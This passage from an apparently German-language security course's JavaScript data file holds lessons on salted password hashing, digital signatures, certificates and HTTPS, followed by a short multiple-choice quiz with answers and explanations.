     <p>Passwörter nie im Klartext speichern – und auch nicht nur „SHA-256". Stattdessen <strong>langsame</strong> Verfahren mit <strong>Salt</strong> (Zufallswert pro Passwort): <code>bcrypt</code>, <code>scrypt</code>, <code>Argon2</code>. Das bremst Massen-Rateangriffe aus.</p>
     <p><strong>Ausprobieren:</strong> Berechne live SHA-256 und spiele mit Caesar/XOR im <a href="#/lab/crypto">Krypto-Labor</a>.</p>`},
    {id:"signatur", title:"Signaturen & Zertifikate", subtitle:"Echtheit und Vertrauen",
     html:`<p>Asymmetrische Kryptografie kann mehr als verschlüsseln – sie beweist <strong>Echtheit</strong>.</p>
     <h3>Digitale Signatur</h3>
     <p>Der Absender „unterschreibt" mit seinem <em>privaten</em> Schlüssel; jeder kann mit dem <em>öffentlichen</em> Schlüssel prüfen, dass die Nachricht wirklich von ihm stammt und unverändert ist (Integrität + Authentizität).</p>
     <h3>Zertifikate & PKI</h3>
     <p>Woher weiß man, dass ein öffentlicher Schlüssel wirklich zu „example.com" gehört? Eine <strong>Zertifizierungsstelle (CA)</strong> bestätigt das per <strong>Zertifikat</strong>. Dein Browser vertraut einer Liste von CAs – deshalb erscheint bei HTTPS das Schloss-Symbol.</p>
     <div class="callout warn"><span class="tag">Achtung</span><p>Das Schloss bedeutet „Verbindung verschlüsselt", nicht „Seite ist vertrauenswürdig". Auch Phishing-Seiten haben HTTPS. Prüfe immer die Domain.</p></div>
     <div class="key-points"><h4>Das Wichtigste</h4><ul>
       <li>Symmetrisch = schnell (ein Schlüssel), asymmetrisch = Schlüsseltausch/Signaturen (Schlüsselpaar).</li>
       <li>Hashing ist einweg; Passwörter mit Salt + Argon2/bcrypt speichern.</li>
       <li>Signaturen beweisen Echtheit; Zertifikate/CAs schaffen Vertrauen – aber HTTPS ≠ „seriös".</li>
     </ul></div>`}
  ],
  quiz:[
    {q:"Was unterscheidet asymmetrische von symmetrischer Verschlüsselung?", options:["Sie ist immer schneller","Sie nutzt ein Schlüsselpaar (öffentlich/privat)","Sie braucht keinen Schlüssel","Sie funktioniert nur offline"], answer:1, explain:"Asymmetrie nutzt ein Paar: öffentlich verschlüsselt, privat entschlüsselt."},
    {q:"Welche Eigenschaft hat eine Hashfunktion NICHT?", options:["Einweg (nicht umkehrbar)","Deterministisch","Umkehrbar zur Originaldatei","Kollisionsresistent"], answer:2, explain:"Hashes sind gerade NICHT umkehrbar – man kann die Eingabe nicht zurückrechnen."},
    {q:"Wie speichert man Passwörter sicher?", options:["Im Klartext","Mit MD5","Mit Salt und Argon2/bcrypt/scrypt","Als QR-Code"], answer:2, explain:"Langsame, gesalzene Verfahren (Argon2/bcrypt/scrypt) bremsen Rateangriffe aus."},
    {q:"Was beweist eine digitale Signatur?", options:["Dass die Seite schön aussieht","Authentizität und Integrität der Nachricht","Dass die Datei klein ist","Dass ein VPN aktiv ist"], answer:1, explain:"Die Signatur zeigt, dass die Nachricht vom Inhaber des privaten Schlüssels stammt und unverändert ist."},
    {q:"Was bedeutet das HTTPS-Schloss im Browser?", options:["Die Seite ist garantiert seriös","Die Verbindung ist verschlüsselt","Es gibt keine Viren","Das Passwort ist sicher"], answer:1, explain:"Es sagt nur: Verbindung verschlüsselt. Auch Phishing-Seiten können HTTPS haben – immer die Domain prüfen."}
  ]
}
];
